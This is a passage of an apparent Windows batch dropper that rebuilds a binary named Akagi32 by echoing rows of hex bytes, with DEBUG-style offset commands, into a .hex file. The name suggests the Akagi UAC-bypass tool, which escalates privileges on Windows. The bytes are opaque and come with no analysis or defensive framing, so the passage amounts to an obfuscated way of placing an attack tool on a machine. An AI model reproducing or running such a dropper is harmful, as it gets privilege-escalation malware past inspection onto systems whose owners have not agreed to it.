echo 1b dc 86 b2 e7 fe 98 9e 65 52 84 cd 16 af 5a 9f 9b d0 ac ab b2 6c ac b0 13 c2 ec 0b 78 2d 93 d0 6e 9a c9 73 8a cc a8 bd b1 c2 ad 6d 16 42 0a b7 6d e4 af 6b b6 4c ec b0 51 c2 bc 3b 16 19 5b 35 0c 8c b9 73 e6 fe 98 39 b1 c4 07 48 26 2f 37 b5 1b d6 cc ab b4 0e a1 60 69 a3 85 66 c6 2e 9a b2 3b 8c b9 34 e6 ec 88 31 0e 72 80 7f 7a 2d 32 94 6a a6 a3 4b 86 6f ed b6 25 d3 15 09 65 2d 38 05>>Akagi32.hex
echo e 1100>>Akagi32.hex
echo 69 ac b9 07 eb 5c 9f 5f 31 c6 36 08 57 2d 19 b5 41 9b 5d 5a 96 dc dd c2 51 c4 fd 0b 34 54 8b b3 2a dc f5 63 e6 cc 98 18 57 c2 8e 73 12 7b 2a b7 19 d6 2f 28 4e 6f ea b0 4f c2 b2 3b 16 97 6b 87 6e ed 29 73 37 c7 e9 35 4f 92 94 a3 17 2d 13 e5 6d a2 9f 58 d8 1c d3 92 0d 9a 8e 4d 16 58 8b ba 1b dc ef 18 56 c8 69 32 05 f2 82 0a 06 2a 3f e4 fb c7 cc 5b da 5c d1 df 91 ca fc 1e 04 26 3c 87>>Akagi32.hex
echo e 1180>>Akagi32.hex
echo 63 a8 f9 71 9b 7d 98 73 61 ad 85 7b 16 54 5a b5 19 d6 c4 5b d1 6c b0 b0 41 b6 85 2b 16 84 5b af 5c dc 99 43 e6 fd 98 04 61 8a a8 0b 53 2e 76 82 6b fa f8 5b f1 6c cc fe 64 c2 49 79 16 89 33 b7 6e dc 87 33 e6 c7 98 31 61 8d 81 75 7f 2d 5a db 6b b7 ad 37 b6 2a 89 b0 fb ae 85 6e 14 37 36 b7 60 dc b8 73 c4 b9 98 52 61 b7 85 60 47 2d 68 9b 6b b2 ad 1d da 6c a2 b0 31 c2 a9 0b 10 2d 64 e7>>Akagi32.hex
echo e 1200>>Akagi32.hex
echo 6e e3 d6 a2 e6 d9 ed 30 02 c2 d2 45 16 6e 59 80 6b d6 ad 0e b6 2d d8 f3 61 98 c8 09 55 17 59 dc 65 f7 ef 73 ff be cc 30 12 c2 d0 64 16 40 5a b5 c0 f8 fd 5b 81 6c f6 b0 dc ec 85 b4 21 38 5b b0 5a de de 37 e6 c9 99 30 37 17 85 52 64 2b c7 fc 6b e7 cb db d3 6d c8 18 45 c2 81 0b 15 79 db f4 0f 5c b3 d9 95 4c d7 51 e1 86 ec 8b 18 43 5b ba 9b d6 a4 5f 06 6d c8 32 64 bd 87 c3 56 29 4b b7>>Akagi32.hex
echo e 1280>>Akagi32.hex
echo ae e6 b9 73 f1 fc a8 30 51 84 b5 68 26 5e 6a 36 6b e6 3f 6b 10 5c 6d 80 a3 c2 b5 e9 26 c3 6b 42 5e 23 b9 43 ef fd 8d 01 42 f3 af 0b 27 64 6b ea 5a a0 9c d7 b6 5d 4f 81 c3 f3 32 3a d6 2d 6a 60 5f 02 88 87 d7 cf 98 02 69 f0 bd 39 58 1f 07 b5 59 bb 9f 2f 84 11 ea 36 61 f0 14 39 b6 1f 93 85 a0 dc 8b 7f d5 e1 ab 03 52 6b 85 38 f1 1e af 86 68 e2 bc a4 b5 0e 67 9e 1e d2 fa 1b 69 3d 24 a7>>Akagi32.hex
echo e 1300>>Akagi32.hex
echo 11 cc f9 63 00 00 00 00 61 d8 85 0b d6 94 5b fa 34 4c b9 70 e6 cc 98 b2 65 c2 b5 f4 e9 2d 5a 0d 6b ee 80 5a a6 2c dc 88 78 f2 5d 0b 66 23 44 b7 d4 d2 b9 c7 ef 01 b9 88 61 c3 c9 c6 37 79 32 dc 18 d6 8d 2b c4 03 bf c2 00 af 85 2b 75 4c 35 d9 01 a8 99 73 84 a9 b8 42 14 ac a5 62 16 43 7a f1 24 85 8d 36 d9 ec bc d5 4f cf 88 01 32 29 eb b7 49 d8 70 35 85 a9 3f 25 20 c7 86 b5 8c 41 4f d5>>Akagi32.hex
echo e 1380>>Akagi32.hex
echo 69 d9 0b 5f a3 01 d8 b7 95 f9 2a 1f 7e 6c 5b b0 9f e7 e1 66 84 ce 97 95 a3 d6 84 0c 44 44 39 dd 6a e5 a9 1d b7 62 de e0 24 c2 85 47 17 28 7b b7 33 d9 6b 2b e3 d0 78 30 61 c0 a4 00 17 23 5a b5 61 81 ad 4a b6 6a da a7 79 42 87 1b 96 2c 7b a6 ee dd b9 73 f6 4c 98 30 61 c0 3d 0b 16 2b 5a b2 ee d7 2f 57 d6 ec da 79 61 50 3c ff 17 22 1b b6 6f c9 3b 66 f9 cd 9a b1 7e c2 8a 0f 15 ad 5e b5>>Akagi32.hex
echo e 1400>>Akagi32.hex
echo 6b 12 1d 79 b6 6c f0 31 65 c2 21 3b 17 9d 98 35 64 d4 bb 23 e6 cc 0c bd 68 63 82 88 96 7e c3 78 45 a2 c8 23 c2 ec fb 4c 58 ca 85 09 17 65 da c2 6f 32 b9 74 e3 cd 99 30 40 a2 ab 79 72 4c 2e d4 93 d6 ad 13 77 6a d8 b4 63 fe 40 4f 12 27 12 77 77 9c 97 f0 ef cc f4 f1 65 f2 82 0f 10 a1 5b 75 62 16 83 29 c5 1e 06 d3 a1 c7 47 31 16 29 59 23 7a d7 b3 f3 e3 0c d8 1e 13 a7 e9 64 16 27 98 8b>>Akagi32.hex
echo e 1480>>Akagi32.hex
echo d0 16 ed 9a ec 6c 19 d0 e9 c8 45 02 54 66 55 88 11 df c6 63 99 dc e7 20 1e d2 c8 1b 93 e4 5a c1 5c 53 7f 2f 85 0a 5b b0 58 c2 f1 00 70 bd d8 76 6c de f8 72 93 3b ce 3f d6 f0 85 6d 93 db 2e a6 40 07 cb 5f 3f 5d 18 b2 6e 75 81 01 9d 2d ab d1 eb 1c cc 9c d5 0c 98 56 e8 c3 db 80 d7 ee 96 b5 a7 81 26 a2 8d 96 ad b4 61 f1 45 54 d5 a8 a4 c2 6b d4 3a bb 19 cc 99 e2 14 c7 08 4b 54 2c 05 76>>Akagi32.hex
echo e 1500>>Akagi32.hex
echo 40 2c 0d 53 ba 6c cf 3d 20 7d e3 88 ee 34 5b c0 66 51 f8 53 e9 7b 68 b0 8a c0 0e fa 19 9a 50 1e 69 94 6d fb b4 ad 5b 72 63 83 8b 0e 16 4b 60 47 1a 1a b6 c4 2e 4c 97 87 a7 9c ae ca 49 ed 56 17 a7 d3 ad 0d 3d 9d 58 a2 51 82 93 0b 3a 16 a9 c3 46 8b b6 c4 e6 f6 fe b5 9e b6 9c 20 c0 2d 3c ba 74 92 ad 5b d0 e5 d2 89 04 d7 7d 6c 03 72 d0 71 30 dd 1a 7b b3 47 74 b3 8d d6 d6 0b 40 7a d1 88>>Akagi32.hex
echo e 1580>>Akagi32.hex
echo 03 e6 ad 4b b6 5f 0a 09 05 44 85 0b 9f 2d 0e 4f e5 9b 85 15 df 80 98 08 65 b7 8c 80 9a 15 d2 b4 ab f2 46 5f 3d 20 e0 c8 ea c2 c1 32 36 2e 94 3e 23 30 b9 70 21 45 dd c4 ea 9b a1 0b 9d 64 42 b6 b4 55 44 5a b6 e5 85 40 e8 8f 79 04 9e 2f fb f7 6b 51 a5 62 37 37 13 30 65 5a 08 3f 2e ac a4 e9 4b f7 ad 4b c2 04 58 a4 27 7d 84 4a 17 06 a5 3d 6a eb 34 3b e6 73 18 c9 78 b5 87 0f 36 3d d0 a3>>Akagi32.hex
echo e 1600>>Akagi32.hex
echo e6 9c cf 5a b5 ec 1a b0 41 84 01 cb 62 29 61 75 6e a8 64 7c 58 06 97 8e a1 c2 ae ca 6f 26 d1 e0 93 5b a9 10 49 4c d3 5b 6c 49 c8 f7 96 a8 9b c9 7b 51 ea 72 26 df 88 0b ab be bc 48 00 a6 1f 41 77 3d 23 9b b2 cf d9 50 63 e3 0e 4e 16 dd 54 00 62 84 32 36 0a cc a3 78 75 b1 97 80 56 31 5a 38 6f 5e 26 5f 8e 6f 1f b0 3e 9c de 80 f3 70 98 e8 66 82 8a b3 e4 cd 54 fc e4 0b cd 04 92 a3 1a a3>>Akagi32.hex
echo e 1680>>Akagi32.hex
echo 0f 77 2c 35 3d ec 98 80 ea 92 95 cc 17 2d 7c a7 6e 57 3b f7 06 ce 11 71 65 c2 0e 49 6a a4 1b bd e0 94 ad 2f 3f 2d d4 3b 23 8e 0c 0b 57 3d d0 f5 3e 55 f8 67 e6 47 da 64 e8 83 9d 80 54 2d 02 3c 2a ca 26 19 ea e5 d8 f1 41 49 c7 6b 9f 6c 7f b7 e5 9e dd fa a7 e4 13 72 e1 aa 0c 4a 3a da 1b 99 aa 1f ad 54 01 2e b4 d6 e8 83 b5 13 19 9a d9 f6 47 9c b8 41 6d 4e 9a bc a3 c9 b1 7f 04 a6 18 ad>>Akagi32.hex
echo e 1700>>Akagi32.hex
echo 6b 5f ec 63 3d 2e c4 39 20 42 b9 80 54 0d d2 f6 2e fb 85 32 04 ff 80 bd 24 2a 3c 0a 8e 7b 5a 3e 99 10 ad 5b 3b 2c d9 b1 61 ec f0 fe 7e bd 7b b7 7e fd f9 70 b6 33 8d 20 43 c3 7d 82 16 58 ae e5 e6 93 5d 9c f3 4c 28 b0 61 ca 87 4b 17 c5 9c b3 2b 24 79 7f e6 9c f2 30 9e c6 90 3b 96 29 df 75 12 ca 90 1b 95 6c d8 70 15 d7 45 0d 36 a6 7b b5 ae dc 91 b3 e6 ff 58 6e 20 e1 65 80 53 d5 8b 5d>>Akagi32.hex
echo e 1780>>Akagi32.hex
echo 49 d7 8e 17 56 63 e0 31 8d 5e c5 03 15 09 f9 a7 3d ef a9 a8 6f 91 64 50 44 94 d2 38 1e d2 d1 c5 cb c5 5d d2 c3 94 d8 39 3c 2e 8a 14 16 a5 43 9a ca cf 4f 93 f6 8c 93 28 21 c9 00 cb de 22 d2 85 0b 1e 14 1b 36 6d 78 e1 61 a4 bc 12 63 d5 54 00 2b d4 4b f2 0f ed 9a e1 98 4f 81 0b 5e ae 9a b7 3b bc a5 0d be 93 cd b4 01 c6 0e f3 93 d2 1b b8 ea 30 b8 73 e6 4c a3 b5 21 02 f1 2f 2d d5 2e 95>>Akagi32.hex
echo e 1800>>Akagi32.hex
echo 0e c6 a5 d0 79 0a d8 ed 70 a4 0c 1a 56 a0 1b b5 61 6b a9 12 ef 49 1e e2 85 ad 05 08 2f 32 2e bd 8e dd 3f e5 f7 67 62 ec 41 d5 ae fa 17 2b 99 fe 6e da bd 7d 6d 1c 1f 50 62 d6 1b 07 f6 20 f8 af ab d7 47 4c 3d 59 9b a5 41 32 d2 5b e9 fb 9b b6 a9 99 bb a7 c7 ee 11 75 bd 4f c0 df 16 7d 32 8a 6b d9 ad d6 f3 6c 24 39 3c 1a d5 cc 53 cd 59 f7 1e da 30 2e 02 45 c5 d8 39 3d 90 03 06 28 7b ba>>Akagi32.hex
echo e 1880>>Akagi32.hex
echo 51 26 a6 33 38 0c 18 b0 a1 c1 a5 0f 9d 30 6f 05 6e d4 55 23 8c 8c 83 84 31 a8 87 aa 64 2c 2f 49 94 05 8d 55 a4 2f c1 b0 6a ff 80 0b 16 ad 54 32 6c 20 49 77 19 b9 74 5a 69 3d 81 7e ee 19 4b 45 ee 20 a2 df 74 88 a8 b1 ec 87 69 5b a6 2c 8b b4 36 8a d3 71 76 cc 98 34 9e 92 81 1e 00 2d ba b0 e9 d6 b9 2a b0 32 d4 77 63 87 d4 0f 16 a8 80 b8 ea 4c 28 13 e5 9f f0 48 60 c0 90 2f 46 2d 5a 36>>Akagi32.hex
echo e 1900>>Akagi32.hex
echo af de 20 de de 93 27 9c 9e 7b 14 25 3e 08 e2 96 1c 51 fc a1 22 e4 99 bd ec 43 87 cc f4 2f 8b b7 4b 3e 64 a7 49 93 f8 b2 31 49 d7 ca 46 08 31 b7 7b dc ea 52 c0 cc 99 00 25 49 5d 8e cd 59 79 4a 7b a3 69 a4 a3 fd d0 4f 14 0a 04 88 16 7b d0 c2 96 b6 b9 53 f8 8e 84 20 69 29 a7 38 cd 26 5b a4 ee 34 bd 4e 47 74 33 b5 52 19 45 09 f2 a6 1e b7 51 a8 a9 23 c2 66 95 d0 2c 46 8f 5c 90 29 05 eb>>Akagi32.hex
echo e 1980>>Akagi32.hex
echo e0 15 19 67 35 7d f3 41 53 26 7d 8a fa 55 9b 3d 2a 5f 84 92 ee cc 97 b4 10 d2 6d 9b 24 d0 a5 4a 0b cf 28 be 06 7c 99 d2 6e 4f c1 2f 06 bd e5 b8 6a 1e 9d ca e9 80 bc 20 a6 a2 87 79 19 09 8b 4e 9b c4 a7 59 46 5b 9c 94 29 9a 8a 14 c7 6c 5b b7 a6 de e8 33 6b 98 bc 6c 89 89 55 1a 95 69 9e b1 4b cb d2 66 b2 7c f8 c3 69 ba 3c 1b 26 a8 d6 33 4a b4 fe d3 e5 35 9e d0 63 9a 08 87 74 2c b2 75>>Akagi32.hex
echo e 1a00>>Akagi32.hex
echo 5e 2c 52 a4 0c ac a8 a1 64 c3 c1 7f ef 6d 4d b3 4a 8c f9 79 f2 21 d9 30 01 78 93 db 12 a1 8a b1 fa c7 ad 4c 97 dc de a3 9e f6 a1 ef 00 59 7f 31 6a 4f b9 f3 ff 33 67 25 4d 82 80 50 97 10 b9 89 a7 26 bc 3b a1 64 38 e8 05 c2 d2 80 6b 21 0c e1 06 0c fc 73 e4 33 cc 11 6d 78 85 db 4c a6 42 7b 83 e3 4d 5c 26 01 cc d8 7d 4f 75 0b 9f 8f 3a 82 6c d8 03 37 d5 ce 12 21 51 c0 da 4b 14 36 63 b0>>Akagi32.hex
echo e 1a80>>Akagi32.hex
echo ca b5 7d 2f a5 84 77 a0 60 61 b4 1c 06 24 5b b2 86 ad 47 8c 19 92 c5 68 a3 d2 85 af 11 4f 5a 0c 5a e2 15 15 e6 3c d3 43 08 3a 96 82 1b 4c 5a 0f cc d8 09 72 6f c1 cc 62 61 9a d5 0b 58 94 8b 2d 01 d4 bc 59 0e 48 da b2 69 e7 d7 0b 1a 7d 5b 0e 42 ac a4 b4 e3 42 88 90 61 a3 81 f4 0f d8 9d b0 5a d5 20 38 b4 44 b8 b2 00 c6 42 0e 3a bd 5b 87 8e ca b9 63 c2 9b 69 13 1c ce e5 0f 63 0a 32 d9>>Akagi32.hex
echo e 1b00>>Akagi32.hex
echo 3b d8 9e 54 de 4a 5c 16 61 42 b6 e3 2f 5d 68 3c 2b f4 a9 b4 e6 2d 9c 88 41 dc 85 56 ea ef 56 75 6c f9 ad 44 b7 73 d9 af 60 dd 84 f4 09 2c 44 b6 71 dd a6 72 f9 cd 87 31 7e c3 9a 0a e9 32 5b aa 6a c9 ac 44 b7 73 d9 af 60 dd 84 14 17 72 44 b6 71 dd a6 72 f9 cd 88 31 49 72 f4 3d 43 1d 5a fd 5b d6 f9 6b b6 00 e8 b0 e5 97 b5 0b 98 1d 5b 1b 5e dc 03 43 e6 1e cd 00 61 1c b5 0b e0 1d 5a b9>>Akagi32.hex
echo e 1b80>>Akagi32.hex
echo eb 0d 81 58 73 b7 28 b3 3d c2 d6 0b 79 2d 5b d1 6e a8 b9 04 e6 ad 98 30 13 c2 e0 0b 4a 2d 1b b5 c9 bd 1d 5b d1 6c b1 40 60 8e 55 0a bc 5b 0b b6 22 ec b9 07 b6 ce fd 00 63 c3 e5 0a 16 6c 31 d4 0c bf 8d 5b da 09 ac c4 04 b0 a5 6d 16 42 2e d9 0a e6 99 56 91 4c eb 30 44 c2 f6 0b 6f 1d 5a 1f 1f 26 af 36 06 6e b7 40 62 b6 d5 0a 74 71 21 b6 5d dc 8b 03 e0 bd 9c 53 21 c2 e8 0b 72 2d 74 65>>Akagi32.hex
echo e 1c00>>Akagi32.hex
echo 69 ae ac 6b b6 6c d8 c5 02 af c9 64 16 4c 3f f4 0f b0 d5 11 87 cc fb 5b 4d e2 e1 67 7a 0d 5c d9 7b d7 7c 5e 9a 4c 9c dc 0d c2 c7 6a 65 48 7b 8a 4e f9 91 03 ec c1 98 34 0a 92 86 79 16 7f 34 e5 6b ba ad 0a b3 42 08 b4 0d c1 56 c5 a9 29 30 d2 1c b2 dc 1f 96 ff aa 10 03 f3 81 59 1d 1c 52 c0 6c 66 a4 2a bb 91 db f3 13 a7 e4 7f 16 48 0b c5 01 bf dc 00 95 cc cf 30 61 92 f0 7f 36 54 5a da>>Akagi32.hex
echo e 1c80>>Akagi32.hex
echo 1e a4 8d 28 df 0b b6 b0 00 b6 f0 79 73 0d 33 d2 6e ae dc 73 ae a5 fa 59 0a ca ec 2b 77 f8 5b d0 19 a0 c4 5b d5 09 f4 90 20 a6 e8 62 6a 5f 3a 25 b9 bd bf 45 e6 f9 75 c1 6a 1e 04 5b 17 c5 7b b5 6b 3e a2 b8 b7 71 6d b1 6f 21 85 54 16 31 5a af da 4e b9 b3 e6 20 ba 37 a5 fc a1 0b 1d 2b 7a b2 64 df a4 73 95 6c d8 86 34 c2 86 43 16 2e 0f b7 6d b0 b9 70 62 99 18 31 ef 42 84 a7 96 2c e0 35>>Akagi32.hex
echo e 1d00>>Akagi32.hex
echo 6a 04 f8 db b7 b2 58 b1 97 42 84 07 96 08 77 b4 ef fb b9 51 ce cd d6 44 25 a7 85 67 73 59 3f fe 0e af ad 5b 29 6e 8a c4 0d 83 e9 67 16 42 38 d6 1a b9 f1 16 87 c4 e8 30 1f 42 8a 44 66 48 34 bc ea d8 37 58 36 62 9e c2 04 a7 85 5e 78 44 38 d8 0a b9 ea 73 92 be f1 5e 06 c2 85 e4 37 ac 51 fc 05 bf d9 d7 bd 87 d8 b0 2f b6 c6 67 79 5e 3e b7 6c 53 3b 6f 89 be f5 51 15 81 85 7e 64 5f 3f db>>Akagi32.hex
echo e 1d80>>Akagi32.hex
echo 1f 83 de 5f d3 1e 58 99 31 a3 f1 63 16 63 ce 35 60 5c 92 f1 de a2 9c b0 53 8c 85 7f 45 59 3b c1 1e a5 f9 5b d9 28 b7 c3 24 b0 f7 64 16 5f 5b 96 6e 98 db 14 b6 ed 18 08 15 c2 85 f9 97 3c 09 d0 6b a2 e1 3a c5 18 8f d9 0f c6 b6 39 15 3c 5b f5 6c 92 cd 33 b2 a9 ea 5d 08 ac 05 54 46 2d 28 da 08 b3 de 28 b6 6c da dd a0 d5 c0 73 66 4c 35 d3 6e 99 d7 05 8f be f7 5e 0c 41 c5 2b 55 02 29 ea>>Akagi32.hex
echo e 1e00>>Akagi32.hex
echo 3e d6 7f 9b 8e 6c 89 c5 04 b0 fc 5d 77 41 59 c2 ac 9d d7 07 82 a0 f4 1e 9e 02 85 82 4f d2 58 ca 7b a9 bd 24 a6 13 c8 cf 71 d3 e9 1b 17 2d 4b 97 68 c4 b9 73 44 4c 93 37 60 c2 84 0b 14 1d aa b7 4b df a9 5b b6 24 b8 b3 01 82 b5 0b 16 fd 59 b7 6f 90 b9 a3 e4 ce ac 10 63 94 85 58 16 72 5a 95 3d d6 e8 5b e4 4c d9 f9 61 6a ca 0b 58 cd 5a fe ce dc ff 13 e7 8d d9 36 dc c6 6a f5 16 8d 56 b2>>Akagi32.hex
echo e 1e80>>Akagi32.hex
echo eb d6 af 5b 1e 6a d8 b0 84 c2 f3 34 97 2e 39 b7 6a fc ba f5 e7 ce 99 1e 64 22 88 0a f6 24 2e b5 19 d6 c4 1b b6 02 d8 d7 61 84 65 0b 7a 3d 5b d2 6e 95 19 72 80 cc f7 35 c1 c6 8f 69 12 1d 5a 81 6b e6 e9 5b 8f 0c d8 84 61 a0 25 0b 16 7d 5b 85 6e d5 19 7e a5 ac 9c 5d 31 c2 f5 0b 77 cd 5f cc cb c7 cc 57 b6 01 78 b7 e0 c9 d0 0b 51 2d d1 97 4e de d6 13 ed b8 98 58 20 c0 a8 ab 1d 22 3a b3>>Akagi32.hex
echo e 1f00>>Akagi32.hex
echo 0e da e9 7b b3 1f d8 12 02 a0 8a 7b 16 59 7b b8 01 7c b1 32 85 cb d9 30 22 c2 c8 eb 15 0d 1e b5 2a 76 b3 29 b6 0a b8 b9 25 4e 85 47 36 2d ba b4 58 dc b2 9b ee ee ce d0 65 b0 85 78 fe 2a 68 b5 c3 f8 ad 6c d6 6c e8 d0 61 f3 a5 0a bd 8c 4c 56 68 f2 19 51 e7 ae 83 44 03 c4 2f 65 f6 3b 36 1d 7d 9e cd 53 d4 0c d8 e6 0a a2 85 ea 13 4b 3b 36 6f bc b7 16 b7 ec bb 51 61 ae e5 19 79 4d 47 cc>>Akagi32.hex
echo e 1f80>>Akagi32.hex
echo 76 f4 bb 3c d6 76 d8 34 11 c0 a5 0b bf 68 fb a2 5c 7c 9d 42 e6 f9 b8 31 4c 6f 23 0a 21 0d 5b 44 49 e8 4f 42 f9 88 d2 8f 40 f3 24 06 f3 09 fa a3 cd f6 50 60 c8 cc 92 54 41 d0 e9 ca 02 2d 76 b5 6d 83 4d 7a e6 8c df df c1 c0 f0 6b 3c 59 6a 1f 74 dc b9 26 46 e4 7b 19 61 c2 db 31 74 20 31 b0 46 fe 58 7c f2 cc d5 b1 7c 22 b4 6a 36 20 fe a4 49 99 b9 73 c2 7e 98 b0 38 c2 d1 ab 15 cc 1b c6>>Akagi32.hex
echo e 2000>>Akagi32.hex
echo 8b c5 4f 3a 5c 56 d1 b4 d1 c3 81 69 00 b2 5b 08 51 d8 86 77 d9 c8 a7 34 5d c6 85 34 82 0d 58 b5 90 e6 ff 6a eb 5d 76 81 61 7e b4 a6 24 9a 69 6b 5c dc 57 41 13 fe c8 03 3c f1 85 64 25 ac 69 7f 58 27 9e 5b ba 58 9b 84 31 f6 d9 3f 16 b8 6f 0c 5a 18 8d af d2 cc 7a 04 5e f7 cb 3e 41 18 5a d1 5e a3 98 da 83 fa ed b0 fe f7 28 3e d8 18 27 81 6e 6c 8f ce d0 0b ae e1 57 c2 77 3d ee 1b 5a 82>>Akagi32.hex
echo e 2080>>Akagi32.hex
echo 7b e1 ad 4d 81 70 ef 94 56 f4 b2 0b 54 1a 3d 80 13 eb 3b 44 e6 44 af be 56 66 b2 a2 21 2d f5 82 de e1 6d 6c 72 5b d8 6d 56 25 b2 e0 21 dc 6c b7 9b eb b3 4b f6 f4 8d 08 91 d9 bd 27 2e 32 51 aa 6a c9 ac 44 b7 93 c7 b1 7e c3 9a 0a 09 2c 44 b6 71 dd a6 72 f9 cd 67 2f 60 dd 84 14 17 32 5b aa 6a c9 ac 44 b7 73 d9 b1 70 c3 00 00 00 00 00 00 61 dc 85 0b 0d 97 5b fa 34 4c b9 70 e6 cc 98 b2>>Akagi32.hex
echo e 2100>>Akagi32.hex
echo 65 c2 b5 f4 e9 2d 5a 0d 6b ee 80 5a a6 2c dc 88 78 f2 65 0b 66 23 44 b7 d4 d2 b9 c7 ef 01 b9 88 61 c3 c9 c6 37 79 32 dc 18 d6 8d 2b c4 03 bf c2 00 af 85 2b 75 4c 35 d9 01 a8 99 73 84 a9 b8 42 14 ac a5 62 16 43 7a f1 24 85 8d 36 d9 ec bc d5 4f cf 88 01 32 29 eb b7 79 28 47 98 b5 59 08 88 20 c7 86 85 7c 76 e2 e3 69 d9 3c 5f 0e 2b d8 b7 a5 09 1d b2 4c 3c 59 b0 fe 65 eb 73 e1 0d 53 5f>>Akagi32.hex
echo e 2180>>Akagi32.hex
echo 43 7a 84 0c d2 e6 c8 b7 64 84 c4 47 d5 04 d9 8b 65 8c 8b 0d 46 68 5b b7 6e 90 b8 77 e6 98 ba e1 63 9a 80 17 f6 2d 58 94 60 d7 dd 55 b6 6c d4 b0 70 c2 86 8a 1d ad 71 ad ee de a9 f3 e7 ec 18 31 61 c2 87 1b 96 2d 5a b5 69 d6 ad 5d 81 6c df 35 60 40 89 5b 96 2f 5b 21 72 ea 40 72 e9 8c 9d 31 74 40 90 0a 14 ac 45 b5 64 97 ac 58 f6 4f d8 b0 35 42 80 7b 13 2d 2f 8b ee df b9 43 e6 cc a0 df>>Akagi32.hex
echo e 2200>>Akagi32.hex
echo 60 76 04 0e 9f 2c 5a 01 eb 5b a4 fa b1 ec 8b 32 01 5a 96 25 62 48 23 c3 ee d3 45 c0 ed cc 9a 31 29 43 f0 0a e4 2d 5d b0 6a d7 ac 7a 98 1e bc d1 15 a3 85 c7 16 89 5a 8e 6e d8 b9 7b a6 cb 59 3b 66 c7 8c cb 17 ad 72 f5 45 a4 de 29 68 0f 18 b2 a3 f2 45 39 14 a1 43 b7 6a 54 b9 82 25 c5 fd 5c 0e c2 8f c9 22 2d 5e 74 3b 22 ad 47 78 65 9a fb 65 bd 86 74 06 52 4b b0 11 cc c6 63 8b dc 1d f9>>Akagi32.hex
echo e 2280>>Akagi32.hex
echo 15 f5 00 0b c4 59 69 d3 e8 ef ad 2f f6 67 be 20 e2 03 87 4a 17 58 5b 40 38 d3 0e 41 80 49 6e b0 15 d1 ae da 70 a4 6b 75 69 d6 a2 ec b2 66 53 40 07 47 85 cb 63 c2 68 77 08 55 b8 73 b8 47 59 f3 ad 0e d2 80 16 d4 61 4f 1e d2 9e 9b e9 6c 1b 35 9e b7 80 88 de d2 5a b7 6f 0e cc 76 6b 8e 99 6f 69 01 ae f1 b6 25 56 a2 e6 97 ad e4 d0 ef 20 a9 16 ca 08 0b 57 0d 54 00 9e 37 bb f8 b6 3d 97 87>>Akagi32.hex
echo e 2300>>Akagi32.hex
echo 6b 69 87 cb b6 2f 9b bd e8 14 af 1a b8 69 be 8b 91 c2 f1 cd 19 9a 93 b8 d9 1a e9 2d cd 0d c7 f0 6d 0e 80 0b 40 39 d1 44 eb c4 9d 1b a0 40 e3 42 61 b6 ad 5c 19 9a 61 d1 eb dc 46 07 ff e7 4e 56 6e dd c5 4f 16 2d 3c 3c 52 b3 b8 a3 97 0b cd ef ea 04 db a8 1e 78 d0 b7 82 8d 32 b2 6f 89 64 67 e1 47 45 7f 5e a6 27 bd eb d1 af 1a 16 65 e5 e3 6e 75 9a 41 16 4b de 6c 1a f1 ef f8 93 ac 94 1b>>Akagi32.hex
echo e 2380>>Akagi32.hex
echo 99 cd 9a 49 4e 6d 59 ad 6a d6 a3 4f d0 e5 c1 fa 6e 75 0d 4f 19 2f fb bc 20 57 61 32 ed cc 7c bb 24 3e db 38 c4 4b da 3c 7a 8d f2 d0 53 31 3e bb 61 41 69 03 41 a6 a1 3e 13 5c 41 48 29 b9 9f bb a0 a0 86 7b 93 e4 2f b2 0b f2 6c 5f b6 62 2d f0 6e 75 92 58 9b 6f fe 95 2c 59 19 51 3e 2c 87 ea e8 9f 79 2b 06 05 55 31 c6 76 95 0d 55 75 d7 07 e3 c3 e5 06 62 02 54 a8 ea 9e 82 6b e9 7b 48 3b>>Akagi32.hex
echo e 2400>>Akagi32.hex
echo 66 c3 a2 c9 70 16 9a 76 1f c3 a2 ec f7 cd cb f1 72 da 5c 55 4d 89 56 55 54 2d 32 ac e6 47 69 1b b8 cd 9a 4b 16 05 55 02 7d 3d aa a3 b6 63 22 bf 69 75 91 38 c6 27 d8 71 6c ba a9 48 1e b9 96 71 6b 04 db 50 95 49 43 15 6a a2 5f d0 eb 90 f8 91 61 49 f8 f3 ff 77 a4 48 91 d5 1c 7e 2a 00 78 1b e2 2e a9 58 36 7b 0d 72 2e 2e ac 4d 3b 29 d4 5c d8 83 0f ee 01 eb 5b b7 e3 dc f9 72 65 25 99 45>>Akagi32.hex
echo e 2480>>Akagi32.hex
echo 94 aa 95 67 37 2d 4a 55 68 86 52 4e f2 40 f8 92 60 05 c0 df 57 a7 d2 b7 2b 00 34 36 32 9c f2 31 21 4f c0 f3 d1 68 82 74 63 86 25 9c f3 8c 79 39 a6 87 61 ca 17 a5 9c f2 86 1d b9 8c f3 8c 98 37 71 47 45 04 9e ed 50 b5 e0 cb cf 1f 16 6d 1f f5 95 83 86 ee 1b a0 7b f2 92 1b fc 8f c7 ce c8 bd e1 87 71 5b 7c 2d 30 b4 0b d6 ad 5b 49 19 20 4f b2 49 75 0f 97 d3 9b 03 ae a9 c2 17 6d ce 95 31>>Akagi32.hex
echo e 2500>>Akagi32.hex
echo 6e 3d f0 f7 7c 25 d1 b5 22 e6 52 2a ae 93 cd 94 88 42 8c 80 ee 8d 6e ea 0e d4 3f 74 a6 c8 9a 67 e5 c5 00 fd 6e 00 a5 c0 73 da fa b3 b7 a7 fc b8 ea 32 d2 1f 7c 2d 7e bf 26 fc b1 f6 10 c3 9c b8 19 e2 a1 38 e0 c6 4f d1 ed 77 2c 57 b7 68 98 80 9e b2 c5 07 47 2c 5f 3c 2b 24 99 22 e1 4c b8 0c 68 c3 8b cd 49 cd 76 50 36 14 a5 55 b6 4f 86 50 48 22 d4 03 93 db 2e 37 64 64 56 73 e6 0c c6 71>>Akagi32.hex
echo e 2580>>Akagi32.hex
echo 62 c2 d6 80 4b 21 df 6e 1e dd a5 00 0e 9c 9d b2 e2 bc 81 0b 1e 7a 2f f3 2d d0 b6 c4 d8 4f 98 f7 63 95 0e 4b 26 47 52 a6 69 db cc 42 3f 6f 38 bc 42 4b fe 0b 12 22 ec b9 bf 35 e8 8c e6 ba 9c e1 8e 49 4d 80 c1 2d b2 5c 97 29 52 d8 72 64 5d b0 42 99 57 0e 49 76 e3 b6 0b d9 bc 82 fa 9f 99 38 53 19 0e 45 26 0d df 7c 64 52 34 eb a2 e7 ae a2 49 b2 88 8f 98 8d 5b e0 e5 a1 b9 7f 6d db 70 c5>>Akagi32.hex
echo e 2600>>Akagi32.hex
